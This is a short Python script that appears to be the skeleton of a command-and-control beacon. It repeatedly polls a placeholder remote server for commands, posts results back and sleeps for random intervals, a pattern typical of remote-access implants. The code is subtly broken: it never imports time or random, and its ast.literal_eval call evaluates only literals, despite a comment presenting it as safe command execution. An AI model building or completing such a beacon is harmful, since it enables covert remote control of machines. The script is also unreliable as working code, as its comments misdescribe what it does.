import ast
import requests
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace these with the actual server address and port
server_address = '<REMOTE_SERVER_IP_HERE>'
server_port = '<REMOTE_SERVER_PORT_HERE>'

# Construct the full URL for the server
url = f'http://{server_address}:{server_port}/'

while True:
    # Make a request to the server to get the next command
    try:
        response = requests.get(url)

        # Check the status code of the response
        if response.status_code != 200:
            logging.warning(f'Received non-200 status code: {response.status_code}')
            continue

        # Load the response payload as JSON
        payload = response.json()

        # If the payload contains a 'command' field, execute the command
        if 'command' in payload:
            try:
                # Use a restricted execution environment to safely evaluate the command
                result = ast.literal_eval(payload['command'])
                logging.info(f'Executed command: {payload["command"]}')

                # Send the result back to the server
                data = {'result': result}
                requests.post(url, json=data)
            except Exception as e:
                # If an exception is raised, send the exception message back to the server
                data = {'exception': str(e)}
                requests.post(url, json=data)
                logging.error(f'Error executing command: {e}')
    except Exception as e:
        # If an error occurs while making the request, log the error
        logging.error(f'Error making request: {e}')


    # Wait for a random interval before making the next request
    time.sleep(random.uniform(5, 15))
